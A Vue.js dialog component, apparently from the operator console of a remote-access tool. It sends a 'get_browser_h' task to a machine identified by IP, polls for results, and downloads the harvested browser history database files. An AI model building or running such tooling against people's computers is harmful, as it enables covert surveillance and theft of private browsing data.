<template>
  <el-dialog
    v-loading="browserHistoryLoading"
    element-loading-background="rgba(0, 0, 0, 0.5)"
    title="浏览器列表"
    width="70%"
    top="10vh"
    :visible.sync="bhdata.browserHistoryVisible"
    @close="browserHistoryClose"
  >
    <div slot="title">
      {{ bhdata.ip }} — 历史记录
    </div>
    <div>
      <el-button type="primary" icon="el-icon-refresh" plain @click="sendBrowserHistory">获取浏览器历史记录</el-button>
    </div>
    <br>
    <el-table
      :data="browserHistoryData"
      height="400px"
      max-height="400px"
      border
      row-key="id"
      lazy
      :load="loadBrowserHistory"
      :tree-props="{ hasChildren: 'hasChildren'}"
    >
      <el-table-column prop="id" label="ID" width="100"></el-table-column>
      <el-table-column prop="user" label="计算机名" width="200"></el-table-column>
      <el-table-column prop="browser" label="浏览器" :show-overflow-tooltip="true" min-width="30%"></el-table-column>
      <el-table-column prop="file_path" label="文件位置" :show-overflow-tooltip="true" min-width="30%"></el-table-column>
      <el-table-column prop="update_time" label="获取时间" min-width="40%"></el-table-column>
      <el-table-column label="操作" align="center" width="180">
        <template v-if="row.browser !== '浏览器'" slot-scope="{row}">
          <el-button type="success" size="mini" plain @click="downloadHistory(row)">下载历史记录</el-button>
        </template>
      </el-table-column>
    </el-table>
  </el-dialog>
</template>

<script>
import { submitTask, getBrowserHistory } from '@/api/consoleApi'
import { getToken } from '@/utils/auth'
export default {
  name: 'BrowserHistory',
  props: {
    bhdata: {
      type: Object,
      default: () => {}
    }
  },
  data() {
    return {
      baseUrl: 'https://baidu.com/index.php', //服务器地址
      browserHistoryLoading: false,
      timer: '',
      browserHistoryData: []
    }
  },
  watch: {
    bhdata: {
      handler: function(data) {
        if (data.browserHistoryVisible === true) {
          this.browserHistoryLoading = true
          this.init(data)
        }
      },
      deep: true
    }
  },
  methods: {
    // 获取浏览器历史记录
    init(val) {
      this.browserHistoryLoading = true
      const data = {
        'token': getToken(),
        'key': val.key
      }
      getBrowserHistory(data).then(response => {
        if (response.code === 20000 && response.status === true) {
          this.browserHistoryData = response.data
          // clearInterval(this.timer)
        } else {
          this.$message({
            message: response.msg,
            type: 'error'
          })
        }
        this.browserHistoryLoading = false
      })
    },
    // 发送获取浏览器历史记录指令
    sendBrowserHistory() {
      const data = {
        'key': this.bhdata.key,
        'content': 'get_browser_h',
        'type': 'get_browser_h',
        'token': getToken()
      }
      // 提交
      submitTask(data).then(response => {
        if (response.code === 20000) {
          this.$notify.success({
            title: 'info',
            message: '获取浏览器历史记录发送成功!!',
            duration: 2000,
            showClose: false
          })
          this.browserHistoryData = []
          this.browserHistoryLoading = true
          // 多次提交，保留一个定时器
          clearInterval(this.timer)
          this.timer = setInterval(() => {
            this.init(data)
          }, 3000)
        }
      })
    },
    // 加载树形浏览器历史记录
    loadBrowserHistory(tree, treeNode, resolve) {
      const browserHisList = []
      for (var index in tree) {
        if (typeof (tree[index]) === 'object') {
          var temp = {
            'id': tree.id + '-' + index,
            'user': tree[index]['user'],
            'browser': tree[index]['browser'],
            'file_path': tree[index]['data'],
            'update_time': tree.update_time
          }
          browserHisList.push(temp)
        }
      }
      setTimeout(() => {
        resolve(browserHisList)
      }, 300)
    },
    // 下载到本地
    downloadHistory(row) {
      var save_name = row['id'] + '_' + row['user'] + '_' + row['browser'] + '.db'
      var downloadLink = this.baseUrl + '/M2/download_hl?token=' + getToken() + '&path=' + row.file_path + '&save_name=' + save_name + '&t=' + Math.round(new Date())
      window.open(downloadLink)
    },
    // 关闭
    browserHistoryClose() {
      clearInterval(this.timer)
      this.browserHistoryData = []
      this.bhdata.browserHistoryVisible = false
    }
  }
}
</script>

<style>
</style>
